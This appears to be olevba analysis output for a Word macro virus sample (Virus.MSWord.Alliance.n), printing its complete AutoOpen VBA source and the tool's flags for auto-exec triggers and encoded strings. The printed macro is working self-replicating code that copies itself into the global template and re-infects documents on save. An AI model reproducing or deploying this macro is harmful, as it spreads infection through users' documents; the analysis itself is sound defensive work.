olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alliance.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alliance.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Alliance.n - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Virus Macro.Word.Subject"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim Fname$
Dim MacName$
On Error GoTo -1: On Error GoTo ErrorHandler

Fname$ = WordBasic.[FileName$]()
MacName$ = Fname$ + ":AutoOpen"

WordBasic.FileSummaryInfo Subject:="Macro.Word.Subject"
WordBasic.FileSummaryInfo Author:="Duke/SMF"

WordBasic.MacroCopy MacName$, "Global:AutoNew", -1
WordBasic.MacroCopy MacName$, "Global:AutoOpen", -1

ErrorHandler:

If WordBasic.IsDocumentDirty() = -1 Then
  WordBasic.MacroCopy "Global:AutoOpen", MacName$, -1
End If
WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

